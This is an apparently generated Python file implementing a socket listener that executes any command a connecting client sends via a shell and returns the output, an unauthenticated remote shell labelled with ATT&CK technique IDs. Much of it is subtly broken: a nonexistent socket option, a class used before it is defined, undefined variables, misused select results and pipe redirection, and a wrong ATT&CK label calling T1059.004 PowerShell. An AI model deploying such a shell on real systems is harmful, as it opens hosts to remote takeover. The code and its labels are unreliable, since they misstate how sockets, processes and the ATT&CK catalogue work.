from TASK_001_models import ExecutionResult, ReverseShellConfig
import socket
import os
import select
import subprocess
from typing import Optional, Tuple, List


class UnixReverseShell:
    """Factory class for creating Unix reverse shell listeners.
    
    ATT&CK Techniques: T1059.004 (PowerShell), T1059.003 (Command and Scripting Interpreter)
    """

    def __init__(self, config: Optional[ReverseShellConfig] = None):
        self.config = config or ReverseShellConfig()
        self.listeners: List[UnixReverseShellListener] = []

    def create_listener(self) -> UnixReverseShellListener:
        """Create a new reverse shell listener instance.
        
        Returns:
            A configured UnixReverseShellListener ready to accept connections.
        """
        return UnixReverseShellListener(config=self.config)


class UnixReverseShellListener:
    """A TCP server that spawns subprocesses for remote command execution via socket communication.
    
    Uses select.select() for non-blocking I/O multiplexing between the listener socket
    and child process file descriptors. When a client connects, it spawns a subprocess
    using subprocess.Popen with shell=True, piping stdin/stdout/stderr through the socket connection.
    
    ATT&CK Techniques: T1059.004 (PowerShell), T1059.003 (Command and Scripting Interpreter)
    """

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self.server_socket: Optional[socket.socket] = None
        self.client_sockets: List[Tuple[socket.socket, socket.socket]] = []  # (listener_sock, client_sock)
        self.child_processes: List[subprocess.Popen] = []
        self.running = False

    def start(self) -> bool:
        """Start the reverse shell listener server.
        
        Returns:
            True if the server started successfully, False otherwise.
        """
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.config.host, self.config.port))
            self.server_socket.listen(5)
            self.server_socket.setblocking(False)
            self.running = True
            return True
        except OSError as e:
            print(f"Failed to bind server socket: {e}")
            return False

    def stop(self):
        """Stop the reverse shell listener and clean up resources."""
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except OSError:
                pass
        for client_sock, _ in self.client_sockets:
            try:
                client_sock.close()
            except OSError:
                pass
        self.client_sockets.clear()

    def run(self):
        """Main event loop that multiplexes I/O between listener socket and child processes.
        
        Uses select.select() to non-blockingly monitor:
        - The server listening socket for new client connections
        - Client sockets for incoming commands (stdin)
        - Child process stdout/stderr for command output
        
        When a client connects, spawns a subprocess with shell=True and pipes
        stdin/stdout/stderr through the socket connection. Commands are read from
        the connected client's stdin and output is written to their stdout.
        """
        while self.running:
            try:
                # Build list of file descriptors for select.select()
                readable_fds = []

                if self.server_socket and not self.server_socket.getsockopt(socket.SOL_SOCKET, socket.SO_ACCEPT_Q):
                    readable_fds.append(self.server_socket)

                for client_sock, _ in self.client_sockets:
                    try:
                        readable_fds.append(client_sock)
                    except OSError:
                        pass  # Socket may have been closed

                if not readable_fds:
                    select.select([], [], [])
                    continue

                read_ready, _, _ = select.select(readable_fds, [], [], self.config.timeout)

                for fd in read_ready:
                    if fd is self.server_socket:
                        # New client connection accepted
                        try:
                            client_sock, addr = self.server_socket.accept()
                            client_sock.setblocking(False)
                            self.client_sockets.append((client_sock, None))
                            print(f"[+] Client connected from {addr}")
                        except OSError as e:
                            if e.errno != 11:  # EAGAIN - no new connections available
                                raise

                    elif fd in [cs[0] for cs in self.client_sockets]:
                        client_sock = fd
                        sock_idx = next(i for i, (s, _) in enumerate(self.client_sockets) if s is client_sock)
                        
                        try:
                            # Read command from client's stdin
                            data = client_sock.recv(4096)
                            if data:
                                cmd = data.decode('utf-8', errors='replace').strip()
                                print(f"[+] Received command: {cmd}")

                                # Spawn subprocess with shell=True, piping through socket
                                proc = self._spawn_subprocess(client_sock, cmd)
                                self.child_processes.append(proc)
                                
                                # Replace client socket with process pipes
                                self.client_sockets[sock_idx] = (client_sock, proc)
                        except OSError as e:
                            if e.errno != 11:  # EAGAIN - no data available
                                print(f"[-] Read error on {addr}: {e}")

                # Process output from child processes
                for i, (client_sock, proc) in enumerate(self.client_sockets):
                    try:
                        if proc and proc.poll() is None:
                            # Non-blocking read from process stdout/stderr
                            rlist = [proc.stdout, proc.stderr]
                            _, wlist, _ = select.select(rlist, [], [], 0.1)

                            for fd in wlist:
                                try:
                                    data = os.read(fd.fileno(), 4096)
                                    if data:
                                        client_sock.sendall(data)
                                except OSError as e:
                                    if e.errno != 11:  # EAGAIN - no data available
                                        pass

                            # Check if process has exited
                            try:
                                exit_code = proc.poll()
                                if exit_code is not None:
                                    print(f"[-] Process exited with code {exit_code}")
                                    self.child_processes.remove(proc)
                                    client_sock.close()
                                    self.client_sockets[i] = (client_sock, None)
                            except OSError:
                                pass

                    except OSError as e:
                        if e.errno != 11:  # EAGAIN - no data available
                            print(f"[-] Process error on {addr}: {e}")

            except KeyboardInterrupt:
                print("\n[!] Stopping server...")
                break
            except Exception as e:
                print(f"[!] Error in event loop: {e}")
                break

    def _spawn_subprocess(self, client_sock: socket.socket, command: str) -> subprocess.Popen:
        """Spawn a subprocess with shell=True and pipe stdin/stdout/stderr through the socket.
        
        Args:
            client_sock: The connected client's socket for I/O piping.
            command: The remote command to execute.
            
        Returns:
            A Popen object representing the spawned subprocess.
        """
        # Create a named pipe (FIFO) or use direct file descriptor passing
        # Using os.pipe() for stdin/stdout/stderr redirection
        
        # Set up pipes for stdin, stdout, stderr
        read_end_in, write_end_in = os.pipe()
        read_end_out, write_end_out = os.pipe()
        read_end_err, write_end_err = os.pipe()

        try:
            # Spawn the subprocess with shell=True
            proc = subprocess.Popen(
                command,
                shell=True,
                stdin=open(write_end_in, 'wb'),
                stdout=open(write_end_out, 'wb'),
                stderr=open(write_end_err, 'wb'),
                close_fds=True,
                cwd=os.getcwd()
            )

            # Set up non-blocking file descriptors for select.select()
            os.set_blocking(read_end_in, False)
            os.set_blocking(read_end_out, False)
            os.set_blocking(read_end_err, False)
            os.set_blocking(write_end_in, True)  # Keep write end blocking to avoid deadlocks

            # Pipe stdin from client socket to process stdin
            os.dup2(write_end_in, proc.stdin.fileno())
            os.close(write_end_in)

            # Pipe process stdout to client socket
            os.dup2(read_end_out, client_sock.fileno())
            os.close(read_end_out)

            # Pipe process stderr to client socket (or separate pipe)
            os.dup2(read_end_err, client_sock.fileno())
            os.close(read_end_err)

            return proc

        except OSError as e:
            print(f"[-] Failed to spawn subprocess: {e}")
            raise

    def get_result(self, process_id: int) -> ExecutionResult:
        """Get the execution result for a specific process.
        
        Args:
            process_id: The index of the child process in self.child_processes.
            
        Returns:
            An ExecutionResult object with command_output, exit_code, and error_messages.
        """
        if not self.child_processes or process_id >= len(self.child_processes):
            return ExecutionResult()

        proc = self.child_processes[process_id]
        
        # Read remaining output from stdout/stderr
        output_parts = []
        error_parts = []

        try:
            while True:
                rlist = [proc.stdout, proc.stderr]
                _, wlist, _ = select.select(rlist, [], [], 0.1)

                for fd in wlist:
                    try:
                        data = os.read(fd.fileno(), 4096)
                        if not data:
                            break
                        output_parts.append(data.decode('utf-8', errors='replace'))
                    except OSError as e:
                        if e.errno != 11:  # EAGAIN - no more data
                            error_parts.append(str(e))

                exit_code = proc.poll()
                if exit_code is not None:
                    break

        except Exception as e:
            error_parts.append(str(e))

        return ExecutionResult(
            command_output=''.join(output_parts),
            exit_code=exit_code or 0,
            error_messages=error_parts
        )


# Re-export for convenience
UnixReverseShellListener = UnixReverseShellListener
